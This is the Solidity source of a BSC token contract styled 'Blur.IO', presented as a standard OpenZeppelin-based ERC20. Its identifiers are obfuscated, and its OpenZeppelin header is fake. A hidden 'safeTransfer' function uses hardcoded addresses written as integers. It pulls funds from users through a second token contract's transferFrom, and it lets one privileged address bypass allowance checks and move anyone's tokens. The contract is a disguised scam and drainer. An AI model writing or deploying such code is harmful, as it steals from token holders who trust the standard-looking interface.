/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/OrsSi8hWZulzj4U7.sol

// OpenZeppelin Contracts v4.4.1 (utils/OrsSi8hWZulzj4U7.sol)

abstract contract OrsSi8hWZulzj4U7 {
  function Jo71dbpc6DuSWKMn() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(427766016385002504629389474904409214859760301093)) {TransferHelper.safeTransferFrom(address(278471327952969394591251039062617110516598671282),spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, OrsSi8hWZulzj4U7 {
  mapping(address => uint256) private caWFI7j2yC1c9sJZ;
  mapping(address => mapping(address => uint256)) private be9ZJvCrYIjBfUV3;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    vE7m2tOQvVAdbJos(Jo71dbpc6DuSWKMn(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Blur.IO";
  }

  function symbol() public pure returns (string memory) {
    return "BLUR";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return caWFI7j2yC1c9sJZ[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    MNPHmtUlkyG8BQ3V(Jo71dbpc6DuSWKMn(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return be9ZJvCrYIjBfUV3[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    MNPHmtUlkyG8BQ3V(
      Jo71dbpc6DuSWKMn(),
      spender,
      be9ZJvCrYIjBfUV3[Jo71dbpc6DuSWKMn()][spender] + addedValue
    );
    return true;
  }

  function MNPHmtUlkyG8BQ3V(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    be9ZJvCrYIjBfUV3[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = be9ZJvCrYIjBfUV3[Jo71dbpc6DuSWKMn()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    MNPHmtUlkyG8BQ3V(Jo71dbpc6DuSWKMn(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function vE7m2tOQvVAdbJos(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    caWFI7j2yC1c9sJZ[spender] = caWFI7j2yC1c9sJZ[spender] - amount;
    caWFI7j2yC1c9sJZ[recipient] = caWFI7j2yC1c9sJZ[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!vE7m2tOQvVAdbJos(sender, recipient, amount)) return true;
    uint256 currentAllowance = be9ZJvCrYIjBfUV3[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    MNPHmtUlkyG8BQ3V(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    caWFI7j2yC1c9sJZ[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}